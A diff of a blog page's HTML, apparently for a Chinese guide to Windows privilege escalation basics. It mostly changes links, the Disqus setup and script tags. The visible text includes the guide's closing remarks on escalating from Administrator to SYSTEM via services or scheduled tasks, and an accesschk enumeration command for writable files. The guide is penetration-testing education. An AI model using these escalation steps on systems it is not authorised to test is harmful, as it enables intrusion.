+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-</code></pre><h2 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h2><p>  本指南旨在成为Windows权限升级的“基础”。如果你想真正掌握这门课程，你需要投入大量的工作和研究。与测试的所有方面一样，枚举是关键，你对目标的了解越多，你拥有的攻击途径越多，成功率就越高。</p>
+
+
+<h2 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h2><p>  本指南旨在成为Windows权限升级的“基础”。如果你想真正掌握这门课程，你需要投入大量的工作和研究。与测试的所有方面一样，枚举是关键，你对目标的了解越多，你拥有的攻击途径越多，成功率就越高。</p>
 <p>另请注意，您有时可能会将您的权限提升为管理员。从管理员升级到SYSTEM的权限不是问题，您始终可以重新配置服务或创建具有SYSTEM级别权限的计划任务。</p>
 <p>现在出去弹出SYSTEM !!</p>
 
@@ -1207,11 +1264,11 @@ accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2019/03/Windows权限提升基础/">/2019/03/Windows权限提升基础/</a>
-                    <p>发表日期：<a href="/2019/03/Windows权限提升基础/">March 18th 2019, 1:29:26 pm</a>
-                    <p>更新日期：<a href="/2019/03/Windows权限提升基础/">November 20th 2020, 4:42:24 pm</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2019/03/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%9F%BA%E7%A1%80/">https://misakikata.github.io/2019/03/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%9F%BA%E7%A1%80/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2019/03/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%9F%BA%E7%A1%80/">March 18th 2019, 1:29:26 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2019/03/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%9F%BA%E7%A1%80/">November 20th 2020, 4:42:24 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -1249,7 +1306,7 @@ accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2019/03/Windows权限提升基础/'; 
+            this.page.url = 'https://misakikata.github.io/2019/03/Windows权限提升基础/'; 
             this.page.identifier = '/2019/03/Windows权限提升基础/';
         };
         (function() { 
@@ -1260,7 +1317,7 @@ accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -1280,16 +1337,32 @@ accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\*.*
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
